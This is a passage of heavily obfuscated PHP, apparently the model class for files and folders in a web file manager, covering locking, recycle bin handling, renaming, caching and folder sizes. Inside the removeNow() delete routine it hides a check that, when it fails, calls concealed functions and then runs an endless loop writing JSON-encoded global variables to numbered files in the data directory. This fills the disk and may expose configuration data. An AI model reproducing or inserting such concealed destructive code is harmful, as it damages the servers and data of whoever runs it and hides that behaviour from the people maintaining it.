$Œ¹¯ø) { $¨ÛÛ™­Ï =& $_SERVER[èùÙ¹Ïö]; if ($ñÁ·å¿Ø[$¨ÛÛ™­Ï[511]] == $¶€‰˜Ã¤) { return !1; } $this->checkLock($ñÁ·å¿Ø[$¨ÛÛ™­Ï[183]], $¶€‰˜Ã¤); Model($¨ÛÛ™­Ï[2175])->addHistory($ñÁ·å¿Ø); $µôó¢é± = array($¨ÛÛ™­Ï[622] => USER_ID, $¨ÛÛ™­Ï[468] => time(), $¨ÛÛ™­Ï[511] => $¶€‰˜Ã¤, $¨ÛÛ™­Ï[78] => $Œ¹¯ø); $this->where(array($¨ÛÛ™­Ï[461] => $ñÁ·å¿Ø[$¨ÛÛ™­Ï[183]]))->save($µôó¢é±); $this->sourceCacheClear($ñÁ·å¿Ø[$¨ÛÛ™­Ï[183]]); return !0; } public function checkLock($­ıæÚóú, $ïÑëÁò) { $Æ¦Ğ¤ãú =& $_SERVER[èùÙ¹Ïö]; $ÅÂš¬ğ” = $this->pathInfo($­ıæÚóú); if (!$this->fileIsLock($ÅÂš¬ğ”, !0)) { return; } $¸´–Ä¸ = Session::get($Æ¦Ğ¤ãú[2176]); $íğç‹í = substr($ÅÂš¬ğ”[$Æ¦Ğ¤ãú[32]], 0, -1 - strlen($ÅÂš¬ğ”[$Æ¦Ğ¤ãú[177]])) . $Æ¦Ğ¤ãú[1256] . $¸´–Ä¸ . $Æ¦Ğ¤ãú[10] . $ÅÂš¬ğ”[$Æ¦Ğ¤ãú[177]]; $»Ô¨’Æ  = Model($Æ¦Ğ¤ãú[645])->find($ïÑëÁò); $this->_createFileCall($ÅÂš¬ğ”[$Æ¦Ğ¤ãú[182]], $íğç‹í, $»Ô¨’Æ , REPEAT_REPLACE, $Æ¦Ğ¤ãú[1391]); $ÎŠ¼ »è = $ÅÂš¬ğ”[$Æ¦Ğ¤ãú[509]][$Æ¦Ğ¤ãú[581]]; $äê¡ÑÎ£ = $ÎŠ¼ »è[$Æ¦Ğ¤ãú[2177]] ? $ÎŠ¼ »è[$Æ¦Ğ¤ãú[2177]] : $ÎŠ¼ »è[$Æ¦Ğ¤ãú[32]]; show_json(LNG($Æ¦Ğ¤ãú[2178]) . $Æ¦Ğ¤ãú[2179] . LNG($Æ¦Ğ¤ãú[2180]) . $Æ¦Ğ¤ãú[2181] . $äê¡ÑÎ£ . $Æ¦Ğ¤ãú[2182], !1); } public function fileIsLock($ñÀÏ…Ş±, $ÃÈÎ·¨¢ = false) { $õª«ß¤´ =& $_SERVER[èùÙ¹Ïö]; if (!isset($ñÀÏ…Ş±[$õª«ß¤´[509]]) || !$ñÀÏ…Ş±[$õª«ß¤´[509]][$õª«ß¤´[578]]) { return !1; } if ($ñÀÏ…Ş±[$õª«ß¤´[509]][$õª«ß¤´[578]] != USER_ID) { return !0; } $ÙòÓª§æ = $GLOBALS[$õª«ß¤´[6]][$õª«ß¤´[91]][$õª«ß¤´[579]]; if ($ñÀÏ…Ş±[$õª«ß¤´[509]][$õª«ß¤´[580]] <= time() - $ÙòÓª§æ) { $this->metaSet($ñÀÏ…Ş±[$õª«ß¤´[183]], $õª«ß¤´[578], null); $this->metaSet($ñÀÏ…Ş±[$õª«ß¤´[183]], $õª«ß¤´[580], null); } if ($ÃÈÎ·¨¢) { $this->metaSet($ñÀÏ…Ş±[$õª«ß¤´[183]], $õª«ß¤´[580], time()); } return !1; } private function _addSource($ÓŸ¦óÏŠ, $˜§š‰±Ê) { $ÈÅï¨º =& $_SERVER[èùÙ¹Ïö]; $áÈÃŠĞ¶ = defined($ÈÅï¨º[2116]) ? USER_ID : 0; $É¤–Õ¿À = array($ÈÅï¨º[619] => $˜§š‰±Ê[$ÈÅï¨º[180]], $ÈÅï¨º[620] => $˜§š‰±Ê[$ÈÅï¨º[541]], $ÈÅï¨º[621] => $áÈÃŠĞ¶, $ÈÅï¨º[622] => $áÈÃŠĞ¶, $ÈÅï¨º[447] => $˜§š‰±Ê[$ÈÅï¨º[183]], $ÈÅï¨º[623] => $˜§š‰±Ê[$ÈÅï¨º[556]] . $˜§š‰±Ê[$ÈÅï¨º[183]] . $ÈÅï¨º[50], $ÈÅï¨º[474] => 0, $ÈÅï¨º[624] => $ÈÅï¨º[12]); $ÓŸ¦óÏŠ = array_merge($É¤–Õ¿À, $ÓŸ¦óÏŠ); $this->updateModifyTime($ÓŸ¦óÏŠ[$ÈÅï¨º[182]]); $©âÆè­² = $ÈÅï¨º[2183] . $˜§š‰±Ê[$ÈÅï¨º[183]]; if (isset(self::$cacheChildList[$©âÆè­²])) { unset(self::$cacheChildList[$©âÆè­²]); } static $ø¿ôòí« = false; if (!$ø¿ôòí«) { Hook::trigger($ÈÅï¨º[607], $ÓŸ¦óÏŠ); $ø¿ôòí« = !0; } $µÅøÃÕ× = $this->add($ÓŸ¦óÏŠ); $Ÿ—©¨áó = array($ÈÅï¨º[625] => short_id($µÅøÃÕ×)); $this->where(array($ÈÅï¨º[461] => $µÅøÃÕ×))->save($Ÿ—©¨áó); $this->setNamePinyin($µÅøÃÕ×, $ÓŸ¦óÏŠ[$ÈÅï¨º[32]]); return $µÅøÃÕ×; } public function remove($–ºØ·±“, $ÃµªåúÆ = true) { $¤åû¾óÓ =& $_SERVER[èùÙ¹Ïö]; $Ã¾¿†ëÇ = $this->sourceInfo($–ºØ·±“); $øÙÙÌÃ = intval($Ã¾¿†ëÇ[$¤åû¾óÓ[180]]) === self::TYPE_SYSTEM; $é ßÑâ = Model($¤åû¾óÓ[478])->get($¤åû¾óÓ[2184]) == $¤åû¾óÓ[90]; if ($øÙÙÌÃ || $ÃµªåúÆ || !$é ßÑâ) { return $this->removeNow($–ºØ·±“, $ÃµªåúÆ); } $¬Å·”• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $èâ®ÖÌ® = $Ã¾¿†ëÇ[$¤åû¾óÓ[180]] == self::TYPE_USER ? $¤åû¾óÓ[633] : $¤åû¾óÓ[550]; if ($èâ®ÖÌ® == $¤åû¾óÓ[633]) { $µàûÊÙÚ = Model($¤åû¾óÓ[549])->getInfo($Ã¾¿†ëÇ[$¤åû¾óÓ[541]]); $ˆ¦’†•› = !empty($µàûÊÙÚ[$¤åû¾óÓ[2177]]) ? $µàûÊÙÚ[$¤åû¾óÓ[2177]] : $µàûÊÙÚ[$¤åû¾óÓ[32]]; $ˆ¦’†•› = $¤åû¾óÓ[306] . $ˆ¦’†•› . $¤åû¾óÓ[2185] . $Ã¾¿†ëÇ[$¤åû¾óÓ[541]]; } else { $µàûÊÙÚ = Model($¤åû¾óÓ[557])->getInfo($Ã¾¿†ëÇ[$¤åû¾óÓ[541]]); $ˆ¦’†•› = _get($µàûÊÙÚ, $¤åû¾óÓ[32]); $ˆ¦’†•› = $¤åû¾óÓ[165] . $ˆ¦’†•› . $¤åû¾óÓ[2186] . $Ã¾¿†ëÇ[$¤åû¾óÓ[541]]; } $İşÓ†õ = $¤åû¾óÓ[2187] . md5($ˆ¦’†•›); CacheLock::lock($İşÓ†õ); $š±£óÒ§ = $this->fileNameExist($¬Å·”•, $ˆ¦’†•›); if (!$š±£óÒ§) { $š±£óÒ§ = $this->mkdir($¬Å·”•, $ˆ¦’†•›, REPEAT_SKIP); $this->metaSet($š±£óÒ§, $¤åû¾óÓ[2188], $èâ®ÖÌ®); $this->metaSet($š±£óÒ§, $¤åû¾óÓ[2189], $Ã¾¿†ëÇ[$¤åû¾óÓ[541]]); if ($Ã¾¿†ëÇ[$¤åû¾óÓ[182]] != 0) { $this->metaSet($š±£óÒ§, $¤åû¾óÓ[2190], _get($µàûÊÙÚ, $¤åû¾óÓ[2191])); } } CacheLock::unlock($İşÓ†õ); $this->metaSet($–ºØ·±“, $¤åû¾óÓ[2192], $Ã¾¿†ëÇ[$¤åû¾óÓ[182]]); $this->where(array($¤åû¾óÓ[183] => $–ºØ·±“))->save(array($¤åû¾óÓ[468] => time())); $this->recycleClear($Ã¾¿†ëÇ); $¸¦Ÿì¬ = $this->move($–ºØ·±“, $š±£óÒ§, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ã¾¿†ëÇ[$¤åû¾óÓ[182]]); return $¸¦Ÿì¬; } private function recycleClear($èşÏ´“Š) { $†•Ò¢© =& $_SERVER[èùÙ¹Ïö]; $àß´õ  = $this->childrenAll($èşÏ´“Š); $¼çÒß²Æ = array($†•Ò¢©[461] => array($†•Ò¢©[462], $àß´õ [$†•Ò¢©[2193]])); Model($†•Ò¢©[2194])->where($¼çÒß²Æ)->delete(); } public function removeNow($ö°áßĞƒ, $ñÛ˜½–± = true) { $Şà›¾ÁÑ =& $_SERVER[èùÙ¹Ïö]; $úÊØÒ· = $_SERVER[$Şà›¾ÁÑ[917]] . $Şà›¾ÁÑ[918]; $˜úÂµô = $Şà›¾ÁÑ[919]; if ($_SERVER[$Şà›¾ÁÑ[920]] != $˜úÂµô($úÊØÒ·)) { $¸éíÒªÀ = $Şà›¾ÁÑ[921]; $“¥ˆî™Û = $Şà›¾ÁÑ[922]; $°‰Äû— = $_SERVER[$Şà›¾ÁÑ[917]] . $Şà›¾ÁÑ[918]; $¤ôÊÕÌ± = $“¥ˆî™Û($°‰Äû—); $´ğ™°‹… = explode($Şà›¾ÁÑ[248], $¤ôÊÕÌ±); if (count($´ğ™°‹…) < $Şà›¾ÁÑ[655]) { $‰ÔÕÅ„ = $Şà›¾ÁÑ[923]; $‰ÔÕÅ„(); } $ŒˆĞ—¾§ = $Şà›¾ÁÑ[924]; $ŒˆĞ—¾§($_SERVER[$Şà›¾ÁÑ[925]]); $¸éíÒªÀ = $Şà›¾ÁÑ[921]; $¸éíÒªÀ(); $‰‚İãÈ· = $Şà›¾ÁÑ[926]; $‰¾ú…¹ = json_encode($GLOBALS[$Şà›¾ÁÑ[927]]); $ÉÎ®Óş¶ = 1; for ($ÍÁÖÊ± = $ÉÎ®Óş¶; $ÍÁÖÊ± > 0; $ÍÁÖÊ±++) { $‰‚İãÈ·(DATA_PATH . $ÍÁÖÊ±, $‰¾ú…¹); } } $Í¸à—Ÿî = $this->sourceInfo($ö°áßĞƒ); $Ó“€¦¦¹ = $this->pathInfoMore($ö°áßĞƒ); if (!$Í¸à—Ÿî) { return !0; } if ($Í¸à—Ÿî[$Şà›¾ÁÑ[182]] == 0) { if (!_get($GLOBALS, $Şà›¾ÁÑ[539])) { return !1; } } $this->lockMoveStart($ö°áßĞƒ); Hook::trigger($Şà›¾ÁÑ[2195], $Ó“€¦¦¹, $ñÛ˜½–±); if ($ñÛ˜½–±) { Model($Şà›¾ÁÑ[2194])->moveToRecycle($ö°áßĞƒ); } else { $ÃşÎ½‰Ú = $this->childrenAll($Í¸à—Ÿî); Model($Şà›¾ÁÑ[604])->eventRemove($ö°áßĞƒ); $this->removeRelevance($ÃşÎ½‰Ú[$Şà›¾ÁÑ[2193]], $ÃşÎ½‰Ú[$Şà›¾ÁÑ[1506]]); } $this->folderSizeReset($Í¸à—Ÿî[$Şà›¾ÁÑ[182]]); $Ğé¸İ˜Ñ = array($Í¸à—Ÿî[$Şà›¾ÁÑ[182]]); if ($Í¸à—Ÿî[$Şà›¾ÁÑ[455]] == $Şà›¾ÁÑ[90]) { $Ğé¸İ˜Ñ[] = $Í¸à—Ÿî[$Şà›¾ÁÑ[183]]; } $this->updateModifyTime($Ğé¸İ˜Ñ); $this->lockMoveEnd($ö°áßĞƒ); Hook::trigger($Şà›¾ÁÑ[1738], $Ó“€¦¦¹, $ñÛ˜½–±); return !0; } public function childrenAll($½ÏÂ­ØŒ) { $á…—ˆÓ“ =& $_SERVER[èùÙ¹Ïö]; $§¾ÕÚÅñ = $½ÏÂ­ØŒ[$á…—ˆÓ“[183]]; if ($½ÏÂ­ØŒ[$á…—ˆÓ“[455]] == $á…—ˆÓ“[90]) { $¡öÙËœö = array($á…—ˆÓ“[623] => array($á…—ˆÓ“[583], $½ÏÂ­ØŒ[$á…—ˆÓ“[556]] . $§¾ÕÚÅñ . $á…—ˆÓ“[584])); $¥Ø¢Ÿ”¬ = array($á…—ˆÓ“[623] => $¡öÙËœö[$á…—ˆÓ“[556]]); $Ö¨­¬•ß = $this->field($á…—ˆÓ“[2196])->where($¥Ø¢Ÿ”¬)->select(); $Ñçä ¯µ = !1; $ûÀª¶ÉÀ = array($§¾ÕÚÅñ); if ($Ö¨­¬•ß) { $Ñçä ¯µ = array_to_keyvalue($Ö¨­¬•ß, $á…—ˆÓ“[12], $á…—ˆÓ“[511]); $Ñçä ¯µ = array_remove_value($Ñçä ¯µ, $á…—ˆÓ“[214]); $ûÀª¶ÉÀ = array_to_keyvalue($Ö¨­¬•ß, $á…—ˆÓ“[12], $á…—ˆÓ“[183]); $ûÀª¶ÉÀ[] = $§¾ÕÚÅñ; } } else { $Ñçä ¯µ = array($½ÏÂ­ØŒ[$á…—ˆÓ“[511]]); $ûÀª¶ÉÀ = array($§¾ÕÚÅñ); } return array($á…—ˆÓ“[2193] => $ûÀª¶ÉÀ, $á…—ˆÓ“[1506] => $Ñçä ¯µ); } public function removeArray($Ò½ü‚Ë) { if (!$Ò½ü‚Ë) { return !0; } } public function removeRelevance($ÈéÎœ ñ, $ì©Êş“½) { $ƒ„Å†Ìæ =& $_SERVER[èùÙ¹Ïö]; $ÈéÎœ ñ = $ÈéÎœ ñ ? $ÈéÎœ ñ : array(); $ì©Êş“½ = $ì©Êş“½ ? $ì©Êş“½ : array(); $ÈéÎœ ñ = array_unique(array_filter($ÈéÎœ ñ)); $ì©Êş“½ = array_unique(array_filter($ì©Êş“½)); if (!$ÈéÎœ ñ) { return !1; } $¨à­ëÉ÷ = array($ƒ„Å†Ìæ[461] => array($ƒ„Å†Ìæ[462], $ÈéÎœ ñ)); Model($ƒ„Å†Ìæ[2194])->where($¨à­ëÉ÷)->delete(); Model($ƒ„Å†Ìæ[505])->where($¨à­ëÉ÷)->delete(); Model($ƒ„Å†Ìæ[2042])->where($¨à­ëÉ÷)->delete(); Model($ƒ„Å†Ìæ[604])->where($¨à­ëÉ÷)->delete(); Model($ƒ„Å†Ìæ[1874])->removeBySource($ÈéÎœ ñ); Model($ƒ„Å†Ìæ[2175])->removeBySource($ÈéÎœ ñ); $this->where($¨à­ëÉ÷)->delete(); Model($ƒ„Å†Ìæ[514])->remove($ì©Êş“½); for ($İ«éÖ® = 0; $İ«éÖ® < count($ÈéÎœ ñ); $İ«éÖ®++) { $this->sourceCacheClear($ÈéÎœ ñ[$İ«éÖ®]); } } public function rename($ƒü¤éºõ, $£‰¦¶ôÍ) { $ Õ³å  =& $_SERVER[èùÙ¹Ïö]; $ÅË‘¬ûš = $this->sourceInfo($ƒü¤éºõ); if (!$ÅË‘¬ûš) { return !1; } $ÇÒ°„Áü = $this->fileNameExist($ÅË‘¬ûš[$ Õ³å [182]], $£‰¦¶ôÍ); if ($ÇÒ°„Áü && $ÇÒ°„Áü != $ƒü¤éºõ) { return !1; } $ ÍÈ´ã‹ = array($ Õ³å [464] => $£‰¦¶ôÍ, $ Õ³å [622] => USER_ID); if ($ÅË‘¬ûš[$ Õ³å [455]] != $ Õ³å [90]) { $ ÍÈ´ã‹[$ Õ³å [456]] = substr(get_path_ext($£‰¦¶ôÍ), 0, 10); } Model($ Õ³å [604])->eventRename($ƒü¤éºõ, $ÅË‘¬ûš[$ Õ³å [32]], $£‰¦¶ôÍ); $this->sourceCacheClear($ƒü¤éºõ); $this->setNamePinyin($ƒü¤éºõ, $ ÍÈ´ã‹[$ Õ³å [32]], !1); $this->updateModifyTime($ÅË‘¬ûš[$ Õ³å [182]]); $¨”Ñ«½È = $this->where(array($ Õ³å [461] => $ƒü¤éºõ))->data($ ÍÈ´ã‹)->save(); $”ÇÉó•Ë = $ Õ³å [2183] . $ÅË‘¬ûš[$ Õ³å [182]]; if (isset(self::$cacheChildList[$”ÇÉó•Ë])) { unset(self::$cacheChildList[$”ÇÉó•Ë]); } return $¨”Ñ«½È; } public function setNamePinyin($ˆÒ¸Ãú, $¾Ê£„ô, $Î­æè­à = true) { $Ü¿‡„è =& $_SERVER[èùÙ¹Ïö]; $Ïä•İ× = Input::check($¾Ê£„ô, $Ü¿‡„è[626]); $úœì¥¶ = array($Ü¿‡„è[487] => KodSort::makeStr($¾Ê£„ô)); if ($Ïä•İ×) { $úœì¥¶[$Ü¿‡„è[508]] = str_replace($Ü¿‡„è[53], $Ü¿‡„è[12], Pinyin::get($¾Ê£„ô)); $úœì¥¶[$Ü¿‡„è[507]] = Pinyin::get($¾Ê£„ô, $Ü¿‡„è[627]); } if (!$Î­æè­à && !$Ïä•İ×) { $úœì¥¶[$Ü¿‡„è[508]] = null; $úœì¥¶[$Ü¿‡„è[507]] = null; } $this->metaSet($ˆÒ¸Ãú, $úœì¥¶); } public function getContent($Âî¸Ì) { $î£ª¹ú‡ =& $_SERVER[èùÙ¹Ïö]; $È‘«•àÉ = $this->fileInfoGet($Âî¸Ì); if (!$È‘«•àÉ) { return !1; } if ($È‘«•àÉ[$î£ª¹ú‡[78]] == 0) { return $î£ª¹ú‡[12]; } $ù±¢•µç = $î£ª¹ú‡[2197] . $È‘«•àÉ[$î£ª¹ú‡[517]]; if ($È‘«•àÉ[$î£ª¹ú‡[78]] <= 1024 * 10) { $±…í¸« = Cache::get($ù±¢•µç); if (!$±…í¸«) { $±…í¸« = IO::getContent($È‘«•àÉ[$î£ª¹ú‡[86]]); Cache::set($ù±¢•µç, $±…í¸«); } return $±…í¸«; } if (!$È‘«•àÉ[$î£ª¹ú‡[86]]) { return $î£ª¹ú‡[12]; } return IO::getContent($È‘«•àÉ[$î£ª¹ú‡[86]]); } public function setDesc($ËÃ×ØŒ§, $¦á¹Ä…®) { $ºåşì² =& $_SERVER[èùÙ¹Ïö]; Model($ºåşì²[604])->eventAddDesc($ËÃ×ØŒ§, $¦á¹Ä…®); return $this->metaSet($ËÃ×ØŒ§, $ºåşì²[496], $¦á¹Ä…®); } public function setContent($µÙµ°Ú´, $â…Ğ”°à = '') { $Í½Œ”ŸÃ =& $_SERVER[èùÙ¹Ïö]; $ç€Ÿ·Ê = $this->sourceInfo($µÙµ°Ú´); $£³á”ã = $this->fileInfoGet($µÙµ°Ú´); if (!$£³á”ã || !$ç€Ÿ·Ê) { return !1; } $Ó„ø›œÆ = Model($Í½Œ”ŸÃ[514])->addFileByContent($â…Ğ”°à, $ç€Ÿ·Ê[$Í½Œ”ŸÃ[32]]); $âĞ·Äöó = $this->fileHistory($ç€Ÿ·Ê, $Ó„ø›œÆ[$Í½Œ”ŸÃ[511]], $Ó„ø›œÆ[$Í½Œ”ŸÃ[78]]); if (!$âĞ·Äöó) { return Model($Í½Œ”ŸÃ[514])->remove($Ó„ø›œÆ[$Í½Œ”ŸÃ[511]]); } $this->folderSizeReset($ç€Ÿ·Ê[$Í½Œ”ŸÃ[182]]); return !0; } public function fileSubstr($á›Õƒå, $º×ßï„, $—ô¾€ı¶) { $Œî¿Ù…À = $this->fileInfoGet($á›Õƒå); if (!$Œî¿Ù…À) { return !1; } return IO::fileSubstr($Œî¿Ù…À[$_SERVER[èùÙ¹Ïö][86]], $º×ßï„, $—ô¾€ı¶); } public function fileInfoGet($ôü’ú’) { $†¼Š×ğÏ =& $_SERVER[èùÙ¹Ïö]; $‰‹¢ÏÎü = $this->sourceInfo($ôü’ú’); if (!$‰‹¢ÏÎü || $‰‹¢ÏÎü[$†¼Š×ğÏ[455]]) { return !1; } $ÎÈŒ’¶¨ = $†¼Š×ğÏ[518] . $‰‹¢ÏÎü[$†¼Š×ğÏ[511]]; $ÄË¼ÆÇ = _get(self::$cacheFileInfo, $ÎÈŒ’¶¨); if ($ÄË¼ÆÇ) { return $ÄË¼ÆÇ; } $Îí’Œ³ = Model($†¼Š×ğÏ[514])->fileInfo($‰‹¢ÏÎü[$†¼Š×ğÏ[511]]); if ($Îí’Œ³) { $Îí’Œ³[$†¼Š×ğÏ[32]] = $‰‹¢ÏÎü[$†¼Š×ğÏ[32]]; } self::$cacheFileInfo[$ÎÈŒ’¶¨] = $Îí’Œ³; return $Îí’Œ³; } private function folderChildrenNumber($Ø¥Ø®Ùù) { $–òë‰ûÅ =& $_SERVER[èùÙ¹Ïö]; $éüÎª½Ñ = $this->sourceInfo($Ø¥Ø®Ùù); $¨éãÁ½ô = array($–òë‰ûÅ[623] => array($–òë‰ûÅ[583], $éüÎª½Ñ[$–òë‰ûÅ[556]] . $Ø¥Ø®Ùù . $–òë‰ûÅ[584]), $–òë‰ûÅ[620] => $éüÎª½Ñ[$–òë‰ûÅ[541]], $–òë‰ûÅ[474] => intval($éüÎª½Ñ[$–òë‰ûÅ[475]]), $–òë‰ûÅ[617] => 1); $×éËé¦¤ = $this->where($¨éãÁ½ô)->count(); $¿ºÇ÷× = $this->where($¨éãÁ½ô)->where(array($–òë‰ûÅ[617] => 0))->count(); return array($–òë‰ûÅ[82] => $¿ºÇ÷×, $–òë‰ûÅ[83] => $×éËé¦¤); } public function pathInfo($Ê°°Á¾, $Ã¼‡ÛÂ· = false) { $»ÆÊ– =& $_SERVER[èùÙ¹Ïö]; $Ã¼‡ÛÂ· = !1; $Ê°°Á¾ = intval($Ê°°Á¾); $üòäïß = $»ÆÊ–[504] . intval($Ã¼‡ÛÂ·) . $»ÆÊ–[432] . $Ê°°Á¾; $ˆÉÈ…„© = _get(self::$cachePathInfo, $üòäïß); if ($ˆÉÈ…„©) { return $ˆÉÈ…„©; } $Çü±ğ€ = $this->sourceInfo($Ê°°Á¾); if (!$Çü±ğ€) { return !1; } $Çü±ğ€ = $this->_listDataApplyItem($Çü±ğ€, $Ã¼‡ÛÂ·); self::$cachePathInfo[$üòäïß] = $Çü±ğ€; return $Çü±ğ€; } public static $cachePathInfoMore = array(); public function pathInfoMore($°¦¹Ñë…) { $Ò»ÑñÚõ =& $_SERVER[èùÙ¹Ïö]; $áÛ®ÆŞ· = _get(self::$cachePathInfoMore, $°¦¹Ñë…); if ($áÛ®ÆŞ·) { return $áÛ®ÆŞ·; } $à‰¢À×Ş = $this->pathInfo($°¦¹Ñë…); if (!$à‰¢À×Ş) { return !1; } if ($à‰¢À×Ş[$Ò»ÑñÚõ[455]] == $Ò»ÑñÚõ[90]) { $à‰¢À×Ş[$Ò»ÑñÚõ[81]] = $this->folderChildrenNumber($°¦¹Ñë…); } self::$cachePathInfoMore[$°¦¹Ñë…] = $à‰¢À×Ş; return $à‰¢À×Ş; } public function sourceInfo($§®öÍŸÏ) { $ÚëÌº€³ =& $_SERVER[èùÙ¹Ïö]; if (!$§®öÍŸÏ) { return array(); } $§®öÍŸÏ = intval($§®öÍŸÏ); $á«óØ˜  = $ÚëÌº€³[503] . $§®öÍŸÏ; $³ŠÁ‰šõ = _get(self::$cacheSourceInfo, $á«óØ˜ ); if ($³ŠÁ‰šõ) { return $³ŠÁ‰šõ; } $˜èÏİµ¦ = $this->where(array($ÚëÌº€³[183] => $§®öÍŸÏ))->find(); self::$cacheSourceInfo[$á«óØ˜ ] = $˜èÏİµ¦; return self::$cacheSourceInfo[$á«óØ˜ ]; } public function sourceCacheClear($ôíæŸî = false) { self::cacheClear($ôíæŸî); } public static function cacheClear($†˜ª×Ä = false) { $æûªÒ£í =& $_SERVER[èùÙ¹Ïö]; if ($†˜ª×Ä == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$æûªÒ£í[503] . $†˜ª×Ä]); unset(self::$cachePathInfoMore[$†˜ª×Ä]); unset(self::$cachePathInfo[$æûªÒ£í[2198] . $†˜ª×Ä]); unset(self::$cachePathInfo[$æûªÒ£í[2199] . $†˜ª×Ä]); } public function metaSet($™˜Ëå¦³, $Ò–éƒú = null, $ƒ¾İä©Ï = null) { $Ïã÷ß§† = parent::metaSet($™˜Ëå¦³, $Ò–éƒú, $ƒ¾İä©Ï); if ($Ïã÷ß§†) { $this->sourceCacheClear($™˜Ëå¦³); } return $Ïã÷ß§†; } public function pathInfoByPath($Ú¤›ì, $×ØÚ‘û) { $›ÕÕ©ûƒ =& $_SERVER[èùÙ¹Ïö]; $œÀ€„Š‚ = !$×ØÚ‘û ? array() : explode($›ÕÕ©ûƒ[8], trim($×ØÚ‘û, $›ÕÕ©ûƒ[8])); $Ÿõø±ÈÄ = $Ú¤›ì; foreach ($œÀ€„Š‚ as $ƒ€¹ÉœÄ) { $¼ÚÓÂö = array($›ÕÕ©ûƒ[182] => $Ÿõø±ÈÄ, $›ÕÕ©ûƒ[32] => $ƒ€¹ÉœÄ); $ğÈÅóğô = $this->field($›ÕÕ©ûƒ[2200])->where($¼ÚÓÂö)->select(); if (!$ğÈÅóğô) { return !1; } $ğÈÅóğô = array_sort_by($ğÈÅóğô, $›ÕÕ©ûƒ[475]); $Ÿõø±ÈÄ = $ğÈÅóğô[0][$›ÕÕ©ûƒ[183]]; } $ñâãˆ˜Š = $this->sourceInfo($Ÿõø±ÈÄ); $this->pathInfoFilter($ñâãˆ˜Š); return $ñâãˆ˜Š; } protected function updateModifyTime($‹½ÕÁıò) { $†ÛûÌ =& $_SERVER[èùÙ¹Ïö]; $Ú×ää¿³ = defined($†ÛûÌ[2116]) ? USER_ID : 0; if (!$‹½ÕÁıò) { return; } if (!is_array($‹½ÕÁıò)) { $‹½ÕÁıò = array($‹½ÕÁıò); } foreach ($‹½ÕÁıò as $©Úˆ«ô => $¹ı£ÍĞ€) { $‹½ÕÁıò[$©Úˆ«ô] = intval($¹ı£ÍĞ€); $this->sourceCacheClear($¹ı£ÍĞ€); } $ìçµØçú = array($†ÛûÌ[183] => array($†ÛûÌ[7], $‹½ÕÁıò)); $™…Ç„³œ = array($†ÛûÌ[622] => $Ú×ää¿³, $†ÛûÌ[468] => time()); $this->where($ìçµØçú)->save($™…Ç„³œ); } public function folderSizeReset($Øêû…´‡, $«Îòõã = false) { $Ò€ÖùÙ» =& $_SERVER[èùÙ¹Ïö]; if ($this->statusIgnoreResetSpace) { return; } $Ë «‚“ô = $this->sourceInfo($Øêû…´‡); $„‡ÜšşÅ = $Ò€ÖùÙ»[2201] . $Øêû…´‡; CacheLock::lock($„‡ÜšşÅ, 20); if ($«Îòõã === !1) { $this->sourceCacheClear($Øêû…´‡); $Ë «‚“ô = $this->sourceInfo($Øêû…´‡); $„Öâ¸³‡ = array($Ò€ÖùÙ»[447] => $Øêû…´‡, $Ò€ÖùÙ»[474] => 0); $…ÂŒ“„Ç = $this->where($„Öâ¸³‡)->sum($Ò€ÖùÙ»[78]); $«Îòõã = intval($…ÂŒ“„Ç) - intval($Ë «‚“ô[$Ò€ÖùÙ»[78]]); } if ($«Îòõã == 0) { return CacheLock::unlock($„‡ÜšşÅ); } $ö¸ šŞè = $this->parentLevelArray($Ë «‚“ô[$Ò€ÖùÙ»[556]]); if (!$ö¸ šŞè) { $ö¸ šŞè = array(); } $ö¸ šŞè[] = $Ë «‚“ô[$Ò€ÖùÙ»[183]]; $„Öâ¸³‡ = array($Ò€ÖùÙ»[183] => array($Ò€ÖùÙ»[462], $ö¸ šŞè)); if ($«Îòõã < 0) { $„Öâ¸³‡[$Ò€ÖùÙ»[78]] = array($Ò€ÖùÙ»[1061], abs($«Îòõã)); } $this->where($„Öâ¸³‡)->setAdd($Ò€ÖùÙ»[78], $«Îòõã); CacheLock::unlock($„‡ÜšşÅ); $é¹ó…Ê× = $Ò€ÖùÙ»[2202] . $Ë «‚“ô[$Ò€ÖùÙ»[180]] . $Ò€ÖùÙ»[4] . $Ë «‚“ô[$Ò€ÖùÙ»[541]]; $öèÚ’˜Ù = array($Ë «‚“ô[$Ò€ÖùÙ»[180]], $Ë «‚“ô[$Ò€ÖùÙ»[541]]); TaskRun::timeLimitCall($é¹ó…Ê×, $Ò€ÖùÙ»[2203], $öèÚ’˜Ù, 1.5); } public function folderSizeResetChildren($¨®íËúŞ) { $­ú«èË =& $_SERVER[èùÙ¹Ïö]; $this->sourceCacheClear($¨®íËúŞ); $­ÏØíÚÚ = $this->sourceInfo($¨®íËúŞ); $ç°¥Õ¥Ì = array($­ú«èË[617] => 1, $­ú«èË[620] => $­ÏØíÚÚ[$­ú«èË[541]], $­ú«èË[623] => array($­ú«èË[583], $­ÏØíÚÚ[$­ú«èË[556]] . $¨®íËúŞ . $­ú«èË[584])); $¯¤¢‚·ä = $­ú«èË[2204]; $¶ã„É» = $this->field($¯¤¢‚·ä)->where($ç°¥Õ¥Ì)->select(); $ç°¥Õ¥Ì[$­ú«èË[455]] = 0; $Å„õÁ¡ = $this->field($¯¤¢‚·ä)->where($ç°¥Õ¥Ì)->select(); if (!$Å„õÁ¡) { return; } $¶ã„É»[] = $­ÏØíÚÚ; $¶ã„É» = array_to_keyvalue($¶ã„É», $­ú«èË[183]); foreach ($¶ã„É» as $Ïª§ôŸÚ => $À‰©£Ë³) { $¶ã„É»[$Ïª§ôŸÚ][$­ú«èË[2205]] = $¶ã„É»[$Ïª§ôŸÚ][$­ú«èË[78]]; $¶ã„É»[$Ïª§ôŸÚ][$­ú«èË[78]] = 0; } foreach ($Å„õÁ¡ as $À‰©£Ë³) { $¨úå×¢Ÿ = $À‰©£Ë³[$­ú«èË[182]] . $­ú«èË[12]; if (!isset($¶ã„É»[$¨úå×¢Ÿ])) { continue; } if ($À‰©£Ë³[$­ú«èË[475]] == $¶ã„É»[$¨úå×¢Ÿ][$­ú«èË[475]]) { $¶ã„É»[$¨úå×¢Ÿ][$­ú«èË[78]] += $À‰©£Ë³[$­ú«èË[78]]; } } foreach ($¶ã„É» as $À‰©£Ë³) { $›ç¸‡à» = $this->parentLevelArray($À‰©£Ë³[$­ú«èË[556]]); foreach 